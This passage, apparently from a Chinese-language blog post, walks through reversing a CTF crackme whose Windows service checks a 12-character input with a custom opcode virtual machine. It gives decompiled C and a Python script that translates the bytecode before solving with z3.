OutputDebugStringW(<span class="string">L&quot;maybe you should input something&quot;</span>);</span><br><span class="line">        Sleep(<span class="number">0xBB8</span>u);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v3 = *(_WORD **)(a2 + <span class="number">4</span>);</span><br><span class="line">    v4 = v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( *v3++ )</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">if</span> ( v3 - v4 == <span class="number">12</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dword_4055C0 = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)Dest = <span class="number">0</span>i64;</span><br><span class="line">      byte_4055C4 = <span class="number">0</span>;</span><br><span class="line">      wcstombs(Dest, *(<span class="type">const</span> <span class="type">wchar_t</span> **)(a2 + <span class="number">4</span>), <span class="number">0xC</span>u);</span><br><span class="line">      <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x48</span>u);</span><br><span class="line">      sub_4011D0(v6);</span><br><span class="line">      sub_401280(v6);</span><br><span class="line">      sub_4012D0();</span><br><span class="line">      JUMPOUT(<span class="number">0x4016CB</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    OutputDebugStringW(<span class="string">L&quot;wrong lenth!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    OutputDebugStringW(<span class="string">L&quot;RegisterServiceCtrlHandler() failed!!!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入是12位，sub_4011D0是初始化，通过sub_401280函数进行对opcode的调用，sub_4012D0是进行对比</p>
<p>先看初始化函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">sub_4011D0</span><span class="params">(_DWORD *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// esi</span></span><br><span class="line"></span><br><span class="line">  *this = <span class="number">0</span>;</span><br><span class="line">  this[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  this[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  this[<span class="number">3</span>] = &amp;opcode;</span><br><span class="line">  *((_BYTE *)this + <span class="number">16</span>) = <span class="number">0xF1</span>;</span><br><span class="line">  this[<span class="number">5</span>] = change;</span><br><span class="line">  *((_BYTE *)this + <span class="number">24</span>) = <span class="number">0xF2</span>;</span><br><span class="line">  this[<span class="number">7</span>] = xor;</span><br><span class="line">  *((_BYTE *)this + <span class="number">32</span>) = <span class="number">0xF5</span>;</span><br><span class="line">  this[<span class="number">9</span>] = read;</span><br><span class="line">  *((_BYTE *)this + <span class="number">40</span>) = <span class="number">0xF6</span>;</span><br><span class="line">  this[<span class="number">11</span>] = shift;</span><br><span class="line">  *((_BYTE *)this + <span class="number">48</span>) = <span class="number">0xF8</span>;</span><br><span class="line">  this[<span class="number">13</span>] = add;</span><br><span class="line">  *((_BYTE *)this + <span class="number">56</span>) = <span class="number">0xF9</span>;</span><br><span class="line">  this[<span class="number">15</span>] = sub;</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(<span class="number">0x512</span>u);</span><br><span class="line">  DstBuf = v1;</span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x512</span>u);</span><br><span class="line">  *(_QWORD *)v1 = *(_QWORD *)Dest;</span><br><span class="line">  v1[<span class="number">2</span>] = num;</span><br><span class="line">  qmemcpy(v1 + <span class="number">12</span>, <span class="string">&quot;abcdefghijkl&quot;</span>, <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1818978921</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再看调用方法，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __thiscall <span class="title function_">sub_401280</span><span class="params">(_DWORD *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> op; <span class="comment">// dl</span></span><br><span class="line">  <span class="type">int</span> index; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// ecx</span></span><br><span class="line"></span><br><span class="line">  this[<span class="number">3</span>] = &amp;opcode;</span><br><span class="line">  <span class="keyword">for</span> ( op = opcode; op != (<span class="type">char</span>)<span class="number">0xF4</span>; op = *(_BYTE *)this[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    index = <span class="number">0</span>;</span><br><span class="line">    v4 = this + <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">while</span> ( op != *v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      ++index;</span><br><span class="line">      v4 += <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">if</span> ( index &gt;= <span class="number">7</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__cdecl *)(_DWORD *))this[<span class="number">2</span> * index + <span class="number">5</span>])(this);</span><br><span class="line">LABEL_7:</span><br><span class="line">    ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个调用是通过调用this的数组进行的，判断的是op&#x3D;&#x3D;this[4*i]，然后进行执行this[2 * index + 5]的方法，最后下图比较</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void __noreturn sub_4012D0()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; <span class="regexp">//</span> eax</span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)DstBuf + v0 + <span class="number">64</span>) == byte_403700[v0] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 &gt;= <span class="number">12</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      OutputDebugStringW(L<span class="string">&quot;you are right&quot;</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  OutputDebugStringW(L<span class="string">&quot;wrong!!!&quot;</span>);</span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是逆了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x31</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x34</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x35</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x36</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x37</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x39</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x3A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x3B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0xA4</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x21</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x70</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x97</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x22</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x4F</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x79</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0xD3</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x43</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x5F</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x92</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x25</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x03</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x4A</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x45</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x08</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0xBD</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x46</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x27</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x28</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x39</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x47</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x28</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x7F</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x29</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x48</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x29</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0x3B</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x2A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0x37</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0xC1</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x4A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x2B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xE2</span>, <span class="number">0xBA</span>, <span class="number">0xF2</span>, <span class="number">0xF9</span>, <span class="number">0xE1</span>, <span class="number">0xD1</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x4B</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">this = [<span class="number">0</span>] * <span class="number">16</span></span><br><span class="line">this[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">this[<span class="number">1</span>] = <span class="number">0</span></span><br><span class="line">this[<span class="number">2</span>] = <span class="number">0</span></span><br><span class="line">this[<span class="number">3</span>] = <span class="string">&quot;opcode&quot;</span></span><br><span class="line">this[<span class="number">4</span>] = <span class="number">0xf1</span></span><br><span class="line">this[<span class="number">5</span>] = <span class="string">&quot;change&quot;</span></span><br><span class="line">this[<span class="number">6</span>] = <span class="number">0xf2</span></span><br><span class="line">this[<span class="number">7</span>] = <span class="string">&quot;xor&quot;</span></span><br><span class="line">this[<span class="number">8</span>] = <span class="number">0xf5</span></span><br><span class="line">this[<span class="number">9</span>] = <span class="string">&quot;mov&quot;</span></span><br><span class="line">this[<span class="number">10</span>] = <span class="number">0xf6</span></span><br><span class="line">this[<span class="number">11</span>] = <span class="string">&quot;shift&quot;</span></span><br><span class="line">this[<span class="number">12</span>] = <span class="number">0xf8</span></span><br><span class="line">this[<span class="number">13</span>] = <span class="string">&quot;add&quot;</span></span><br><span class="line">this[<span class="number">14</span>] = <span class="number">0xf9</span></span><br><span class="line">this[<span class="number">15</span>] = <span class="string">&quot;sub&quot;</span></span><br><span class="line">v1 = <span class="string">&quot;xxxxxxxxxxxxabcdefghijkl&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(v1))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">arr = [<span class="number">0</span>] * <span class="number">300</span> </span><br><span class="line"><span class="keyword">while</span> (opcode[i] != <span class="number">0xf4</span>):</span><br><span class="line">    op = opcode[i]</span><br><span class="line">    <span class="keyword">if</span> op == <span class="number">0xf1</span>:</span><br><span class="line">        a1 = opcode[i + <span class="number">1</span>]</span><br><span class="line">        a2 = opcode[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[0] = dstbuf[%d]&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[1] = dstbuf[%d]&quot;</span> % a2) </span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[2] = dstbuf[%d]&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;dstbuf[%d] = arr[0]&quot;</span> % a2)</span><br><span class="line">        i += <span class="number">6</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xf2</span>:</span><br><span class="line">        a2 = opcode[i + <span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;arr[0] ^= arr[1]&quot;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xf5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read input&quot;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xf6</span>:</span><br><span class="line">        a2 = opcode[i + <span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;arr[0] = (2 &lt;&lt; arr[0]) | (arr[0] &gt;&gt; 6)&quot;</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xf8</span>:</span><br><span class="line">        a1 = opcode[i + <span class="number">1</span>]</span><br><span class="line">        a2 = opcode[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[0] += %d&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[1] += %d&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[2] += %d&quot;</span> % a2)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xf9</span>:</span><br><span class="line">        a1 = opcode[i + <span class="number">1</span>]</span><br><span class="line">        a2 = opcode[i + <span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[0] -= %d&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[1] -= %d&quot;</span> % a2)</span><br><span class="line">        <span class="keyword">if</span> a1 == <span class="number">0xe3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;arr[2] -= %d&quot;</span> % a2)</span><br><span class="line">        i += <span class="number">3</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑出来的用z3解密</p>
